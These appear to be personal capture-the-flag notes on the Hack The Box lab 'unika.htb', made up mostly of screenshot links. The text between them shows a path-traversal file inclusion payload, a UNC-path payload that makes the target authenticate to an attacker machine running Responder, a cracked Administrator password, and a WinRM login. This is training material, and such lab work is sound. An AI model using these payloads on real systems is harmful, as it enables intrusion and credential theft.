![[Pasted image 20230910105104.png]]

Plug IP address into web browser and get redirected to:
![[Pasted image 20230910105305.png]]
![[Pasted image 20230910105550.png]]

Add 10.129.22.34 unika.htb to /etc/hosts file & reload web browser
![[Pasted image 20230910110021.png]]
![[Pasted image 20230910110212.png]]
![[Pasted image 20230910110403.png]]
![[Pasted image 20230910110511.png]]
![[Pasted image 20230910110545.png]]
![[Pasted image 20230910111405.png]]
![[Pasted image 20230910111427.png]]

### File Inclusion vulnerability:

![[Pasted image 20230910111533.png]]

page=../../../../../../../../windows/system32/drivers/etc/hosts
![[Pasted image 20230910111829.png]]
![[Pasted image 20230910111853.png]]

![[Pasted image 20230910115943.png]]
![[Pasted image 20230910115954.png]]

![[Pasted image 20230910120252.png]]

## Using Responder
Capital i: ![[Pasted image 20230910120520.png]]
![[Pasted image 20230910120614.png]]
![[Pasted image 20230910120636.png]]
Plug http://unika.htb/?page=//10.10.14.56/somefile into the browser (IP = local IP):
![[Pasted image 20230910122550.png]]
![[Pasted image 20230910122557.png]]

### Hash Cracking:
![[Pasted image 20230910120842.png]]
![[Pasted image 20230910123004.png]]
![[Pasted image 20230910123013.png]]
Administrator password = badminton
![[Pasted image 20230910124047.png]]


### WinRM - logging in with the Administrator credentials
![[Pasted image 20230910123707.png]]
![](../../zzImages/Pasted%20image%2020230919153335.png)
![](../../zzImages/Pasted%20image%2020230919153244.png)
